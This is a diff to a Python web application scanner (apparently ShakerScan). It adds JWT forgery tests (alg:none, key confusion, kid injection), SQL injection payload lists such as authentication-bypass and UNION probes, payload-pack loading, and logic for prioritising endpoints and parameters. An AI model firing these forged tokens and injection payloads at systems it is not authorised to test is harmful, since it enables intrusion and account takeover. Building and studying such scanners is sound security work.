+                        "type": "none_algorithm",
+                        "description": "JWT alg:none forgery accepted (2xx) where a tampered signature was rejected",
+                        "none_alg_status": none_status,
+                        "tampered_signature_status": tampered_status,
+                    })
                 try:
                     import jwt as pyjwt
                     weak_secrets = ['secret', 'password', '123456', 'key', 'jwt', 'token']
@@ -3309,7 +4663,7 @@ async def jwt_algorithm_confusion_test(
                 forged_token = pyjwt.encode(payload, public_key_str, algorithm='HS256')
 
                 # Test the forged token
-                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+                auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
                 test_out, test_err, test_rc = await run(
                     ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                     timeout=10
@@ -3373,7 +4727,7 @@ async def jwt_kid_injection_test(
             try:
                 forged_token = pyjwt.encode(payload, expected_secret, algorithm='HS256', headers={'kid': kid_payload})
 
-                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+                auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
                 test_out, test_err, test_rc = await run(
                     ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                     timeout=10
@@ -3435,7 +4789,7 @@ async def jwt_claim_manipulation_test(
             ({"scope": "admin read write delete"}, "scope_admin"),
         ]
 
-        auth_args = get_auth_curl_args(auth_session)  # Handles None internally
+        auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"authorization", "cookie"})
 
         # Get baseline response with original token
         baseline_out, _, baseline_rc = await run(
@@ -3529,6 +4883,9 @@ async def jwt_comprehensive_test(
 
     # Try to discover token if not provided
     if not sample_token:
+        sample_token = _jwt_token_from_auth_session(auth_session)
+
+    if not sample_token:
         for endpoint in ["/api/login", "/api/auth", "/login", "/auth/login", "/api/token"]:
             login_url = urllib.parse.urljoin(url, endpoint)
             out, err, rc = await run(
@@ -3537,17 +4894,14 @@ async def jwt_comprehensive_test(
                 timeout=10
             )
             if rc == 0 and out:
-                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
-                if m:
-                    sample_token = m.group(0)
+                sample_token = _extract_jwt_from_text(out)
+                if sample_token:
                     break
 
         if not sample_token:
             out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", url], timeout=10)
             if rc == 0 and out:
-                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
-                if m:
-                    sample_token = m.group(0)
+                sample_token = _extract_jwt_from_text(out)
 
     if not sample_token:
         results["error"] = "No JWT token found"
@@ -3565,7 +4919,7 @@ async def jwt_comprehensive_test(
 
     # Test 1: None algorithm + basic weak secrets
     results["tests_run"].append("none_algorithm")
-    basic_results = await jwt_vulnerability_test(url, sample_token)
+    basic_results = await jwt_vulnerability_test(url, sample_token, auth_session=auth_session)
     if basic_results.get("vulnerable"):
         results["vulnerable"] = True
         results["issues"].extend(basic_results.get("issues", []))
@@ -4877,6 +6231,7 @@ def _match_dbms_fingerprint(body: str | None, baseline_body: str | None = None) 
 DBMS_SQLI_PAYLOADS = {
     "sqlite": [
         # Basic payloads
+        ("' OR 1=1--", "auth_bypass_boolean", "Authentication bypass boolean injection"),
         ("')) --", "comment_bypass", "Try double-paren close with comment"),
         ("')) OR 1=1--", "boolean_always_true", "Boolean injection"),
         ("')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union_9col", "Union probe"),
@@ -5003,14 +6358,137 @@ SQLI_CROSS_DBMS_FALLBACK_PAYLOADS = [
 ]
 
 
+def _payload_pack_cap() -> int:
+    """Max payloads pulled from bundled packs per category. Bounded because active
+    checks are budget-time-limited: more payloads = fewer endpoints/params covered
+    in the same window, so we add pack QUALITY (waf-bypass, polyglots, technique
+    packs) not unbounded quantity. Env-overridable; 0 disables packs."""
+    try:
+        return max(0, int(os.environ.get("SHAKERSCAN_PAYLOAD_PACK_MAX", "24")))
+    except (TypeError, ValueError):
+        return 24
+
+
+def _load_custom_payloads(category: str, include_packs: bool = False) -> list[str]:
+    """Load extra payloads for a category (additive).
+
+    Sources, merged in priority order:
+    1. user drop-in ``payloads/<category>/custom.txt`` and the inline env var
+       ``SHAKERSCAN_CUSTOM_<CATEGORY>_PAYLOADS`` (set by the worker from the scan's
+       custom_*_payloads option) — always loaded, unbounded.
+    2. bundled named packs ``payloads/<category>/*.txt`` (polyglots, waf-bypass,
+       auth-bypass, error-based, time-based, ...) — loaded when ``include_packs``,
+       capped at ``_payload_pack_cap()`` so curated hardcoded payloads stay primary
+       and budget isn't blown. §4/§5: prefer payload packs over hardcoded-only.
+    """
+    out: list[str] = []
+    seen: set[str] = set()
+
+    def _add(line: str) -> bool:
+        s = line.strip()
+        if s and not s.startswith("#") and s not in seen:
+            seen.add(s)
+            out.append(s)
+            return True
+        return False
+
+    pack_dirs = [
+        os.path.join(os.path.dirname(__file__), "..", "payloads", category),
+        f"/app/payloads/{category}",
+    ]
+    # 1. custom.txt (user drop-in) — unbounded
+    for d in pack_dirs:
+        p = os.path.join(d, "custom.txt")
+        if os.path.exists(p):
+            try:
+                with open(p, "r", encoding="utf-8", errors="ignore") as fh:
+                    for line in fh:
+                        _add(line)
+            except OSError:
+                pass
+    env_raw = os.environ.get(f"SHAKERSCAN_CUSTOM_{category.upper()}_PAYLOADS")
+    if env_raw:
+        for line in env_raw.splitlines():
+            _add(line)
+    # 2. bundled named packs — capped
+    if include_packs:
+        cap = _payload_pack_cap()
+        added = 0
+        for d in pack_dirs:
+            if added >= cap or not os.path.isdir(d):
+                continue
+            for fname in sorted(os.listdir(d)):
+                if added >= cap or not fname.endswith(".txt") or fname == "custom.txt":
+                    continue
+                try:
+                    with open(os.path.join(d, fname), "r", encoding="utf-8", errors="ignore") as fh:
+                        for line in fh:
+                            if added >= cap:
+                                break
+                            if _add(line):
+                                added += 1
+                except OSError:
+                    pass
+    return out
+
+
+# Technique tiers for the unknown-DBMS wide net, ordered by reliability so an
+# early budget cutoff spends on the highest-signal payloads first:
+#   1. reliable detection — quote/paren closure, boolean, comment, error;
+#   2. time-based — LAST of the detection techniques: a slow response (target
+#      load, not injection) false-positives easily, so it must never be tried
+#      before the deterministic error/boolean payloads;
+#   3. extraction — heavy, column-count-specific UNION/schema/version dumps.
+_SQLI_EXTRACTION_TECHNIQUE_MARKERS = ("union", "schema", "version", "extract", "dump", "col")
+
+
 def _select_sqli_payloads(dbms_key: str | None) -> list[tuple[str, str, str]]:
-    selected_key = dbms_key or "generic"
-    payloads = list(DBMS_SQLI_PAYLOADS.get(selected_key, DBMS_SQLI_PAYLOADS["generic"]))
-    seen = {(payload, technique) for payload, technique, _ in payloads}
+    known_dbms = bool(dbms_key) and dbms_key != "generic" and dbms_key in DBMS_SQLI_PAYLOADS
+    if known_dbms:
+        # Fingerprint succeeded: stay focused on that engine's payloads.
+        payloads = list(DBMS_SQLI_PAYLOADS[dbms_key])
+    else:
+        # DBMS unknown/inconclusive (fingerprint returned nothing — common when a
+        # single-process target degrades under scan load). Do NOT fall back to
+        # generic-only: that set has no paren-closure payloads, so a param wrapped
+        # in ``'))``/``')`` (e.g. Juice Shop's search) is never broken and the SQLi
+        # is missed even though it is trivially present. Cast a wide net across ALL
+        # engine families instead — detection is DBMS-agnostic (_check_sqli_response
+        # scans every error signature), so the only thing that mattered was sending
+        # the right closure payload. On a hit the caller re-fingerprints from the
+        # vulnerable body and self-corrects `dbms`.
+        reliable: list[tuple[str, str, str]] = []
+        time_based: list[tuple[str, str, str]] = []
+        extraction: list[tuple[str, str, str]] = []
+        families = ["generic"] + [k for k in DBMS_SQLI_PAYLOADS if k != "generic"]
+        for fam in families:
+            for payload, technique, description in DBMS_SQLI_PAYLOADS.get(fam, []):
+                tl = technique.lower()
+                if any(m in tl for m in _SQLI_EXTRACTION_TECHNIQUE_MARKERS):
+                    extraction.append((payload, technique, description))
+                elif "time" in tl:
+                    time_based.append((payload, technique, description))
+                else:
+                    reliable.append((payload, technique, description))
+        payloads = reliable + time_based + extraction
+
+    # De-dup (payload, technique) — same payload can recur across families.
+    seen: set[tuple[str, str]] = set()
+    deduped: list[tuple[str, str, str]] = []
+    for payload, technique, description in payloads:
+        if (payload, technique) not in seen:
+            seen.add((payload, technique))
+            deduped.append((payload, technique, description))
+    payloads = deduped
+
     for payload, technique, description in SQLI_CROSS_DBMS_FALLBACK_PAYLOADS:
         if (payload, technique) not in seen:
             payloads.append((payload, technique, description))
             seen.add((payload, technique))
+    for custom in _load_custom_payloads("sqli", include_packs=True):
+        if (custom, "custom") not in seen:
+            payloads.append((custom, "custom", "User-supplied SQLi payload"))
+            seen.add((custom, "custom"))
     return payloads
 
 # Context-specific XSS payloads with WAF bypass variants
@@ -5258,6 +6736,25 @@ def detect_reflection_context(response_body: str, marker: str) -> str:
     return "in_html"
 
 
+def _xss_response_looks_browser_renderable(response_body: str) -> bool:
+    body = str(response_body or "").lstrip()
+    if not body:
+        return False
+    if body[0] in "{[":
+        try:
+            json.loads(body)
+            return False
+        except Exception:
+            pass
+    return bool(
+        re.search(
+            r"</?(html|head|body|script|div|span|p|form|input|textarea|svg|iframe|img|a)\b",
+            body,
+            re.I,
+        )
+    )
+
+
 def _stringify_body_value(value: Any) -> str:
     if isinstance(value, (dict, list)):
         return json.dumps(value)
@@ -5295,6 +6792,24 @@ def _headers_from_curl_args(args: list[str]) -> dict[str, str]:
             continue
         i += 1
     return headers
+
+
+def _curl_header_args_from_mapping(
+    headers: dict[str, Any] | None,
+    *,
+    drop_names: set[str] | None = None,
+) -> list[str]:
+    """Build curl header args from a stored header mapping."""
+    if not isinstance(headers, dict):
+        return []
+    drop = {name.lower() for name in (drop_names or set())}
+    args: list[str] = []
+    for name, value in headers.items():
+        header_name = str(name or "").strip()
+        if not header_name or header_name.lower() in drop or value is None:
+            continue
+        args.extend(["-H", f"{header_name}: {value}"])
+    return args
 
 
 def _build_curl_body_args(body: Any, content_type: str) -> tuple[list[str], list[str]]:
@@ -5388,6 +6903,49 @@ def _fallback_value_for_param(param: str) -> Any:
     return "test"
 
 
+def _get_nested_value(container: dict[str, Any], key: str) -> Any:
+    parts = _normalize_nested_key(key)
+    cursor: Any = container
+    for part in parts:
+        if not isinstance(cursor, dict) or part not in cursor:
+            return None
+        cursor = cursor[part]
+    return cursor
+
+
+def _param_prefers_string(param: str) -> bool:
+    fallback = _fallback_value_for_param(param)
+    return isinstance(fallback, str)
+
+
+def _normalize_synthetic_body_placeholders(body: Any, params: list[str]) -> None:
+    """Repair synthetic JSON templates that used numeric placeholders.
+
+    Coverage/ASM replay specs used to encode unknown JSON bodies as
+    ``{"field": 1}``. That is fine for IDs but breaks common login fields:
+    apps often throw before the injected email payload is evaluated because the
+    sibling password/user field is a number. Keep observed templates intact
+    except for obvious synthetic numeric placeholders on string-like params.
+    """
+    if isinstance(body, list):
+        if not body or not isinstance(body[0], dict):
+            return
+        target = body[0]
+    elif isinstance(body, dict):
+        target = body
+    else:
+        return
+
+    for param in params:
+        if not _param_prefers_string(param):
+            continue
+        current = _get_nested_value(target, param)
+        if isinstance(current, bool):
+            continue
+        if isinstance(current, (int, float)):
+            _set_nested_value(target, param, _fallback_value_for_param(param), overwrite=True)
+
+
 def _path_param_value(param_name: str) -> str:
     """Get appropriate value for a path parameter."""
     param_l = param_name.lower()
@@ -5435,6 +6993,44 @@ def _set_nested_value(container: dict[str, Any], key: str, value: Any, overwrite
         cursor = cursor[part]
     if overwrite or parts[-1] not in cursor:
         cursor[parts[-1]] = value
+
+
+def _descend_synthetic_array(cursor: dict[str, Any], part: str) -> dict[str, Any]:
+    """Return the child dict for ``part`` while preserving list-of-object shape.
+
+    A list-of-objects is flattened as the list key *plus* its element keys, so a
+    scalar placeholder already present for ``part`` when we descend signals an
+    array: reconstruct it as a single-element list rather than a plain dict.
+    """
+    existing = cursor.get(part)
+    if isinstance(existing, list):
+        if not existing or not isinstance(existing[0], dict):
+            existing[:] = [{}]
+        return existing[0]
+    if isinstance(existing, dict):
+        return existing
+    child: dict[str, Any] = {}
+    cursor[part] = [child] if existing is not None else child
+    return child
+
+
+def _synthetic_json_template_from_params(params: list[str]) -> dict[str, Any]:
+    """Build a synthetic JSON body from flattened param paths, reconstructing
+    arrays (list-of-objects) so type-strict endpoints accept the request and
+    active probes reach the vulnerable code path."""
+    template: dict[str, Any] = {}
+    for raw in params:
+        parts = _normalize_nested_key(str(raw or ""))
+        if not parts:
+            continue
+        cursor = template
+        for part in parts[:-1]:
+            cursor = _descend_synthetic_array(cursor, part)
+        leaf = parts[-1]
+        if isinstance(cursor.get(leaf), (dict, list)):
+            continue  # children already populated for this key; don't clobber
+        cursor[leaf] = _fallback_value_for_param(str(raw))
+    return template
 
 
 def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> Any:
@@ -5487,7 +7083,124 @@ def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> 
             else:
                 target.setdefault(param, defaults.get(param, _fallback_value_for_param(param)))
 
+    if nested:
+        template_params = list(dict.fromkeys([*_coerce_param_names(base_params), *_coerce_param_names(body_params)]))
+        _normalize_synthetic_body_placeholders(body, template_params)
+
     return body
+
+
+_VALIDATION_FIELD_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,63}$")
+_VALIDATION_FIELD_DENY_TOKENS = frozenset({
+    "admin", "role", "roles", "permission", "permissions", "privilege", "privileges",
+    "owner", "ownership", "tenant", "price", "amount", "balance", "credit", "payment",
+    "approved", "approval", "verified", "verification", "status", "state",
+})
+
+
+def _safe_validation_field_name(raw: Any) -> str | None:
+    if isinstance(raw, list):
+        parts = [str(part) for part in raw if str(part).lower() not in {"body", "request", "payload"}]
+        raw = ".".join(parts)
+    value = str(raw or "").strip().strip("'\"")
+    value = re.sub(r"^\$\.?", "", value)
+    value = value.replace("[", ".").replace("]", "").strip(".")
+    if not value or not _VALIDATION_FIELD_RE.fullmatch(value):
+        return None
+    token_source = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", value).lower()
+    tokens = {token for token in re.split(r"[^a-z0-9]+", token_source) if token}
+    if tokens.intersection(_VALIDATION_FIELD_DENY_TOKENS):
+        return None
+    return value
+
+
+def _extract_missing_validation_fields(body: str, *, max_fields: int = 5) -> list[str]:
+    """Extract explicit missing-field names from a bounded JSON validation error."""
+    if not body or len(body) > 100_000:
+        return []
+    try:
+        parsed = json.loads(body)
+    except Exception:
+        return []
+
+    found: list[str] = []
+
+    def add(raw: Any) -> None:
+        field = _safe_validation_field_name(raw)
+        if field and field not in found and len(found) < max_fields:
+            found.append(field)
+
+    def missing_signal(value: Any) -> bool:
+        text = str(value or "").lower()
+        return any(marker in text for marker in (
+            "required", "missing", "must not be blank", "must not be null", "may not be empty",
+        ))
+
+    def walk(value: Any, depth: int = 0) -> None:
+        if depth > 8 or len(found) >= max_fields:
+            return
+        if isinstance(value, list):
+            for item in value[:25]:
+                walk(item, depth + 1)
+            return
+        if not isinstance(value, dict):
+            return
+
+        message = value.get("msg") or value.get("message") or value.get("defaultMessage") or value.get("error")
+        error_type = value.get("type") or value.get("code")
+        is_missing = missing_signal(message) or missing_signal(error_type)
+        if is_missing:
+            location = value.get("loc") or value.get("location")
+            explicit = value.get("field") or value.get("name") or value.get("param") or value.get("path")
+            if location:
+                add(location)
+            if explicit:
+                add(explicit)
+            for text in (message, value.get("detail")):
+                if not isinstance(text, str):
+                    continue
+                for pattern in (
+                    r"['\"]([A-Za-z_][A-Za-z0-9_.-]{0,63})['\"]\s+(?:is\s+)?required",
+                    r"(?:missing|required)\s+(?:field|parameter|property)?\s*[:=-]?\s*['\"]?([A-Za-z_][A-Za-z0-9_.-]{0,63})",
+                ):
+                    for match in re.finditer(pattern, text, re.IGNORECASE):
+                        add(match.group(1))
+
+        errors = value.get("errors")
+        if isinstance(errors, dict):
+            for field, error in list(errors.items())[:25]:
+                if missing_signal(error):
+                    add(field)
+        for child in value.values():
+            if isinstance(child, (dict, list)):
+                walk(child, depth + 1)
+
+    walk(parsed)
+    return found
+
+
+def _add_validation_fields_to_body(body: Any, fields: list[str], content_type: str) -> list[str]:
+    if isinstance(body, list):
+        if not body or not isinstance(body[0], dict):
+            return []
+        target = body[0]
+    elif isinstance(body, dict):
+        target = body
+    else:
+        return []
+    nested = "json" in str(content_type or "").lower()
+    added: list[str] = []
+    for field in fields[:5]:
+        if nested:
+            if _has_nested_key(target, field):
+                continue
+            _set_nested_value(target, field, _fallback_value_for_param(field), overwrite=False)
+        else:
+            if field in target:
+                continue
+            target[field] = _fallback_value_for_param(field)
+        added.append(field)
+    return added
 
 
 def _apply_body_param(base_body: Any, param: str, value: Any) -> Any:
@@ -5528,6 +7241,34 @@ def _apply_body_param(base_body: Any, param: str, value: Any) -> Any:
     return new_body
 
 
+def _body_param_current_value(body: Any, param: str) -> Any:
+    if isinstance(body, list):
+        if not body:
+            return None
+        first = body[0]
+        if param == "__item__" or not isinstance(first, dict):
+            return first
+        return _get_nested_value(first, param)
+    if isinstance(body, dict):
+        return _get_nested_value(body, param)
+    return None
+
+
+def _build_sqli_body_baseline(base_body: Any, param: str, canary: str) -> Any:
+    """Build a benign POST SQLi baseline using the same body-path semantics as payload replay."""
+    body = copy.deepcopy(base_body) if base_body is not None else {}
+    current = _body_param_current_value(body, param)
+    if isinstance(current, str):
+        value = f"{current}{canary}"
+    elif current is None and _param_prefers_string(param):
+        value = f"{_fallback_value_for_param(param)}{canary}"
+    elif current is None:
+        value = _fallback_value_for_param(param)
+    else:
+        value = current
+    return _apply_body_param(body, param, value)
+
+
 _CURL_STATUS_MARKER = "__CURL_STATUS__:"
 
 
@@ -5561,19 +7302,13 @@ async def _detect_dbms_post(
     if _is_sqli_documentation_endpoint(endpoint_url):
         return {"detected": None}
 
-    if isinstance(base_body, list):
-        if "json" not in content_type.lower():
-            return {"detected": None}
-        baseline_body = copy.deepcopy(base_body)
-        if not baseline_body:
-            baseline_body = [{}] if param != "__item__" else ["shakerscan_dbms_baseline"]
-        if isinstance(baseline_body[0], dict):
-            baseline_body[0][param] = "shakerscan_dbms_baseline"
-        else:
-            baseline_body[0] = "shakerscan_dbms_baseline"
-    else:
-        baseline_body = dict(base_body) if base_body else {}
-        baseline_body[param] = "shakerscan_dbms_baseline"
+    if isinstance(base_body, list) and "json" not in content_type.lower():
+        return {"detected": None}
+    baseline_body = _apply_body_param(
+        copy.deepcopy(base_body) if base_body is not None else {},
+        param,
+        "shakerscan_dbms_baseline",
+    )
 
     baseline_body_args, baseline_header_args = _build_curl_body_args(baseline_body, content_type)
     baseline_cmd = [
@@ -5585,19 +7320,13 @@ async def _detect_dbms_post(
     baseline_text = baseline_out if baseline_rc == 0 and baseline_out else ""
 
     # Build body with all params (benign values) + injected param
-    if isinstance(base_body, list):
-        if "json" not in content_type.lower():
-            return {"detected": None}
-        test_body = copy.deepcopy(base_body)
-        if not test_body:
-            test_body = [{}] if param != "__item__" else ["1'"]
-        if isinstance(test_body[0], dict):
-            test_body[0][param] = "1'"
-        else:
-            test_body[0] = "1'"
-    else:
-        test_body = dict(base_body) if base_body else {}
-        test_body[param] = "1'"
+    if isinstance(base_body, list) and "json" not in content_type.lower():
+        return {"detected": None}
+    test_body = _apply_body_param(
+        copy.deepcopy(base_body) if base_body is not None else {},
+        param,
+        "1'",
+    )
 
     body_args, header_args = _build_curl_body_args(test_body, content_type)
 
@@ -5615,6 +7344,150 @@ async def _detect_dbms_post(
         return {"detected": fingerprint["dbms"]}
 
     return {"detected": None}
+
+
+_ACTIVE_HIGH_VALUE_KEYWORDS = (
+    "login", "signin", "sign-in", "auth", "session", "password", "passwd",
+    "email", "search", "query", "filter", "account", "admin", "token",
+    "register", "signup", "user", "order", "coupon", "product", "payment",
+)
+
+_ACTIVE_LOW_VALUE_PARAM_KEYWORDS = (
+    "utm_", "fbclid", "gclid", "msclkid", "ga_", "cache", "cachebuster",
+    "timestamp", "nonce", "csrf", "xsrf", "page", "limit", "offset",
+    "per_page", "size", "debug", "locale", "lang",
+)
+
+_ACTIVE_SHARED_PARAM_KEYWORDS = (
+    "q", "query", "search", "term", "keyword", "filter", "where", "sort",
+    "order", "category", "email", "username", "user", "login", "password",
+    "token", "code", "coupon", "id", "uid", "account", "product", "basket",
+    "cart", "message", "comment", "review", "description", "content", "text",
+    "name", "title", "url", "redirect", "return", "callback", "next", "path",
+)
+
+_ACTIVE_SQLI_PARAM_KEYWORDS = (
+    "id", "uid", "user_id", "account", "order_id", "product_id", "basket_id",
+    "cart_id", "coupon", "code", "q", "query", "search", "filter", "where",
+    "sort", "order", "email", "username", "login", "password",
+)
+
+_ACTIVE_XSS_PARAM_KEYWORDS = (
+    "message", "comment", "review", "description", "content", "text", "body",
+    "name", "title", "q", "query", "search", "term", "keyword", "url",
+    "redirect", "return", "callback", "next", "path", "html", "template",
+)
+
+_ACTIVE_ROUTE_PARAM_HINTS = {
+    "search": ("q", "query", "search", "term", "keyword"),
+    "login": ("email", "username", "user", "login", "password"),
+    "signin": ("email", "username", "user", "login", "password"),
+    "auth": ("email", "username", "user", "login", "password", "token", "code"),
+    "review": ("message", "comment", "review", "text", "rating"),
+    "comment": ("message", "comment", "text", "body"),
+    "contact": ("message", "comment", "text", "body", "email", "name"),
+    "coupon": ("coupon", "coupon_code", "code"),
+    "basket": ("basket", "basket_id", "product", "product_id", "id"),
+    "cart": ("cart", "cart_id", "product", "product_id", "id"),
+    "product": ("product", "product_id", "id", "q", "query", "search"),
+}
+
+# Sources from actually-observed traffic/crawl (trustworthy) vs. generated guesses
+# (OPTIONS method fan-out, inferred resource×action permutations) which are mostly
+# phantom and otherwise dominate the budget.
+_ACTIVE_REAL_SOURCES = frozenset({
+    "har_discovery", "har_network_capture", "har", "browser_api_capture", "browser",
+    "url_crawl", "crawl", "discovered_lookup", "js_bundle_analysis", "js", "manual", "openapi", "swagger",
+})
+
+
+def _active_endpoint_priority(ep: dict[str, Any], *, family: str | None = None) -> tuple:
+    """Rank endpoints so real, high-value injection points (observed request bodies,
+    login/search) lead the active-test budget instead of synthetic permutations
+    (e.g. OPTIONS-derived ``/api/<Model>s/<action>``). Keyword alone is not enough —
+    the synthetic generator mimics high-value keywords — so SOURCE leads the sort."""
+    path = str(ep.get("url") or "").lower()
+    method = str(ep.get("method") or "GET").upper()
+    body = ep.get("body_params") or []
+    keyword_hits = sum(1 for k in _ACTIVE_HIGH_VALUE_KEYWORDS if k in path)
+    has_body = 1 if (method in ("POST", "PUT", "PATCH") and body) else 0
+    real_source = 1 if str(ep.get("source") or "").lower() in _ACTIVE_REAL_SOURCES else 0
+    score = active_endpoint_score(ep, family=family)
+    non_low_value = 1 if score >= 8 else 0
+    # Real observed source first, then request-body surface, then keyword relevance,
+    # then the shared DAST score (source/path/parameter penalties). This keeps the
+    # active modules aligned with the upstream worklist scorer while preserving the
+    # old guard against parameter-fanout phantoms.
+    return (non_low_value, real_source, has_body, keyword_hits, score)
+
+
+def _prioritize_active_endpoints(endpoints: list, *, family: str | None = None) -> list:
+    """Stable value-sort of active-test endpoints, highest priority first."""
+    return sorted(endpoints, key=lambda ep: _active_endpoint_priority(ep, family=family), reverse=True)
+
+
+def _active_param_score(
+    param: str,
+    *,
+    family: str | None = None,
+    endpoint: dict[str, Any] | None = None,
+    location: str = "query",
+) -> int:
+    name = str(param or "").strip()
+    if not name:
+        return -1000
+    lowered = name.lower()
+    leaf = lowered.rsplit(".", 1)[-1].rsplit("[", 1)[0]
+    family_key = (family or "all").lower()
+    score = 0
+
+    if location == "body":
+        score += 2
+    if lowered == "q":
+        score += 12
+    if leaf in {"id", "uid"} or leaf.endswith("_id"):
+        score += 6
+    if any(keyword == lowered or keyword == leaf or keyword in lowered for keyword in _ACTIVE_SHARED_PARAM_KEYWORDS):
+        score += 4
+
+    if family_key == "sqli":
+        if any(keyword == lowered or keyword == leaf or keyword in lowered for keyword in _ACTIVE_SQLI_PARAM_KEYWORDS):
+            score += 8
+    elif family_key == "xss":
+        if any(keyword == lowered or keyword == leaf or keyword in lowered for keyword in _ACTIVE_XSS_PARAM_KEYWORDS):
+            score += 8
+
+    if endpoint:
+        path = urllib.parse.urlparse(str(endpoint.get("url") or "")).path.lower()
+        for route_hint, hinted_params in _ACTIVE_ROUTE_PARAM_HINTS.items():
+            if route_hint in path and any(hint == lowered or hint == leaf or hint in lowered for hint in hinted_params):
+                score += 5
+
+    if any(lowered == keyword or lowered.startswith(keyword) or keyword in lowered for keyword in _ACTIVE_LOW_VALUE_PARAM_KEYWORDS):
+        score -= 10
+
+    return score
+
+
+def _prioritize_active_params(
+    params: list[str],
+    *,
+    family: str | None = None,
+    endpoint: dict[str, Any] | None = None,
+    location: str = "query",
+) -> list[str]:
+    """Stable value-sort of params so tight active budgets hit likely bug surfaces."""
+    deduped = list(dict.fromkeys(str(param) for param in params if str(param or "").strip()))
+    return [
+        param
+        for _, param in sorted(
+            enumerate(deduped),
+            key=lambda item: (
+                -_active_param_score(item[1], family=family, endpoint=endpoint, location=location),
+                item[0],
+            ),
+        )
+    ]
 
 
 async def smart_sqli_test(
@@ -5657,6 +7530,8 @@ async def smart_sqli_test(
         "post_endpoints_tested": 0,
         "budget_exhausted": False,
         "budget_exhausted_reason": None,
+        "endpoint_attempts": [],
+        "validation_fields_added": [],
     }
     deadline = time.monotonic() + max_seconds if max_seconds and max_seconds > 0 else None
     budget_logged = False
@@ -5685,6 +7560,14 @@ async def smart_sqli_test(
 
     def _budget_exhausted() -> bool:
         nonlocal budget_logged
+        if _scanner_cancel_requested():
+            results["budget_exhausted"] = True
+            results["budget_exhausted_reason"] = "cancelled"
+            if not budget_logged:
+                print("[sqli] Cancellation requested; stopping SQLi probes", file=sys.stderr)
+                _emit_sqli_progress("cancel requested", force=True)
+                budget_logged = True
+            return True
         if max_findings is not None and results["vulnerabilities_found"] >= max_findings:
             results["budget_exhausted"] = True
             results["budget_exhausted_reason"] = "finding_cap"
@@ -5716,7 +7599,12 @@ async def smart_sqli_test(
     get_endpoints = [
         e for e in endpoints
         if e.get("method", "GET").upper() == "GET"
-        and e.get("params")
+        # Accept query params under EITHER key. Browser/HAR discovery stores them
+        # under ``query_params`` while synthetic/inferred endpoints use ``params``;
+        # the loop below already reads ``params or query_params``, so requiring
+        # only ``params`` here silently dropped real observed injection points
+        # (e.g. /rest/products/search?q=) from SQLi while XSS still tested them.
+        and (e.get("params") or e.get("query_params"))
         and _method_allowed(e, "GET")
         and not _is_hash_route(e.get("url", ""))
         and not _is_sqli_documentation_noise_endpoint(e)
@@ -5729,17 +7617,42 @@ async def smart_sqli_test(
         and not _is_sqli_documentation_noise_endpoint(e)
     ]
 
-    # Test GET endpoints
-    for endpoint in get_endpoints[:max_endpoints]:
+    # Value-sort so real, observed injection points lead. Otherwise a flood of GET
+    # endpoints (incl. synthetic OPTIONS-derived /api/<Model>s/<action> permutations)
+    # consumes the whole budget before real endpoints like POST /rest/user/login.
+    get_endpoints = _prioritize_active_endpoints(get_endpoints, family="sqli")
+    post_endpoints = _prioritize_active_endpoints(post_endpoints, family="sqli")
+    # Guarantee POST-body endpoints (the high-value injection surface) get a share of
+    # the budget. The COUNT reservation is the reliable guard (a single slow GET
+    # iteration can overshoot a time deadline); the time deadline is a secondary cap.
+    _post_reserve = min(len(post_endpoints), max(1, max_endpoints // 2)) if post_endpoints else 0
+    _get_cap = max(1, max_endpoints - _post_reserve)
+    _get_phase_deadline = None
+    if deadline is not None and post_endpoints and get_endpoints:
+        _get_phase_deadline = time.monotonic() + max(1.0, (deadline - time.monotonic()) * 0.6)
+
+    # Test GET endpoints (capped to reserve budget for POST-body endpoints)
+    for endpoint in get_endpoints[:_get_cap]:
         if _budget_exhausted():
             break
+        if _get_phase_deadline is not None and time.monotonic() >= _get_phase_deadline:
+            print("[sqli] GET phase reserve hit; reserving budget for POST-body endpoints", file=sys.stderr)
+            break
         endpoint_url = endpoint.get("url", "")
-        params = endpoint.get("params", []) or endpoint.get("query_params", [])
+        params = _coerce_param_names(endpoint.get("params") or endpoint.get("query_params"))
+        params = _prioritize_active_params(params, family="sqli", endpoint=endpoint, location="query")
         param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}
 
         if not params:
             continue
 
+        attempt = _new_endpoint_attempt(
+            endpoint,
+            "sqli",
+            url_override=endpoint_url,
+            method_override="GET",
+            params=list(params),
+        )
         results["endpoints_tested"] += 1
         results["get_endpoints_tested"] += 1
         _emit_sqli_progress(f"testing GET endpoint {endpoint_url}")
@@ -5759,6 +7672,8 @@ async def smart_sqli_test(
             if _budget_exhausted():
                 break
             results["params_tested"] += 1
+            if attempt is not None:
+                attempt["attempted_params_count"] += 1
             _emit_sqli_progress(f"testing GET param {param}")
             # Get baseline
             parsed = urllib.parse.urlparse(endpoint_url)
@@ -5781,7 +7696,6 @@ async def smart_sqli_test(
 
             baseline_out, _, baseline_rc = await run(baseline_cmd, timeout=12)
             baseline_elapsed = time.time() - baseline_start
-
             if baseline_rc != 0:
                 continue
 
@@ -5793,10 +7707,17 @@ async def smart_sqli_test(
 
             if baseline_status in (405, 415):
                 continue
+            if attempt is not None:
+                attempt["completed_params_count"] += 1
 
             for payload, technique, description in payloads:
                 if _budget_exhausted():
                     break
+                # §5: record which SQLi techniques were attempted per endpoint
+                # (boolean/error/union/auth-bypass/extraction/OOB) so coverage shows
+                # depth, not just "tested".
+                if attempt is not None:
+                    attempt.setdefault("techniques_attempted", set()).add(technique)
                 # Inject payload
                 test_params = dict(baseline_params)
                 test_params[param] = payload
@@ -5826,10 +7747,18 @@ async def smart_sqli_test(
